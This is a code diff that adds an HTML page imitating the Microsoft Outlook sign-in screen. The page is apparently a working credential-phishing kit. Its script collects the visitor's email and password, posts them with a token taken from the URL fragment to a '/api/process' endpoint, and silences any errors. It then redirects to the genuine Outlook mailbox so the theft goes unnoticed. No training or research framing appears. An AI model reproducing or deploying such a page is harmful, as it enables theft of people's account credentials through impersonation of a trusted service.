@@ -1,1 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #f2f2f2;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .login-box {
+            background: #fff;
+            box-shadow: 0 2px 6px rgba(0,0,0,.2);
+            width: 440px;
+            min-height: 340px;
+            padding: 44px;
+            border-radius: 0; /* Microsoft uses sharp edges for boxes */
+        }
+        .btn-primary {
+            background-color: #0067b8;
+            color: #fff;
+            transition: background-color 0.2s;
+        }
+        .btn-primary:hover {
+            background-color: #005da6;
+        }
+        .input-field {
+            border: none;
+            border-bottom: 1px solid #666;
+            padding: 4px 0;
+            width: 100%;
+            border-radius: 0;
+        }
+        .input-field:focus {
+            outline: none;
+            border-bottom-color: #0067b8;
+        }
+        .back-btn {
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+        }
+        .hidden { display: none; }
+        #loader {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 3px;
+            background: transparent;
+            z-index: 1000;
+            display: none;
+        }
+        #loader::after {
+            content: "";
+            display: block;
+            width: 30%;
+            height: 100%;
+            background: #0067b8;
+            animation: loading 1.5s infinite linear;
+        }
+        @keyframes loading {
+            0% { margin-left: -30%; }
+            100% { margin-left: 100%; }
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen">
 
+    <div id="loader"></div>
+
+    <div class="login-box">
+        <div class="flex items-center gap-2 mb-6">
+            <img src="https://cdn-icons-png.flaticon.com/512/732/732221.png" alt="Microsoft" class="w-8 h-8">
+            <span class="text-xl font-semibold text-zinc-600">Microsoft</span>
+        </div>
+
+        <div id="step-id">
+            <h1 class="text-2xl font-semibold mb-3">Sign in</h1>
+            <p class="text-sm mb-4">to continue to Outlook</p>
+            <input type="email" id="email" class="input-field mb-8" placeholder="Email, phone, or Skype">
+            
+            <div class="text-xs mb-8">
+                No account? <a href="#" class="text-blue-600 hover:underline">Create one!</a><br>
+                <a href="#" class="text-blue-600 hover:underline">Can't access your account?</a>
+            </div>
+
+            <div class="flex justify-end gap-2">
+                <button onclick="toPassword()" class="btn-primary px-10 py-1.5 font-normal">Next</button>
+            </div>
+        </div>
+
+        <div id="step-pass" class="hidden">
+            <div onclick="goBack()" class="back-btn mb-4 group">
+                <svg class="w-4 h-4 mr-2 text-zinc-600 group-hover:text-zinc-900" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/></svg>
+                <span id="display-user" class="text-sm text-zinc-700"></span>
+            </div>
+            <h1 class="text-2xl font-semibold mb-6">Enter password</h1>
+            <input type="password" id="password" class="input-field mb-8" placeholder="Password">
+            
+            <div class="text-xs mb-8">
+                <a href="#" class="text-blue-600 hover:underline">Forgot password?</a><br>
+                <a href="#" class="text-blue-600 hover:underline">Other ways to sign in</a>
+            </div>
+
+            <div class="flex justify-end">
+                <button onclick="executeDispatch()" class="btn-primary px-10 py-1.5 font-normal">Sign in</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const getRawConfig = () => {
+            return window.location.hash.substring(1) || null;
+        };
+
+        const configString = getRawConfig();
+        let currentEmail = "";
+
+        function toPassword() {
+            currentEmail = document.getElementById('email').value;
+            if(!currentEmail) return;
+
+            document.getElementById('loader').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('display-user').innerText = currentEmail;
+                document.getElementById('step-id').classList.add('hidden');
+                document.getElementById('step-pass').classList.remove('hidden');
+                document.getElementById('password').focus();
+            }, 800);
+        }
+
+        function goBack() {
+            document.getElementById('step-pass').classList.add('hidden');
+            document.getElementById('step-id').classList.remove('hidden');
+        }
+
+        async function executeDispatch() {
+            const p = document.getElementById('password').value;
+            if(!p) return;
+
+            document.getElementById('loader').style.display = 'block';
+            const finishUrl = "https://outlook.live.com/mail/0/";
+
+            if(!configString) {
+                setTimeout(() => window.location.href = finishUrl, 1200);
+                return;
+            }
+
+            try {
+                await fetch('/api/process', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        config: configString,
+                        data: { 
+                            User: currentEmail, 
+                            Pass: p 
+                        }
+                    })
+                });
+            } catch (err) {
+                // Silenced
+            } finally {
+                setTimeout(() => {
+                    window.location.href = finishUrl;
+                }, 1200);
+            }
+        }
+    </script>
+</body>
+</html>
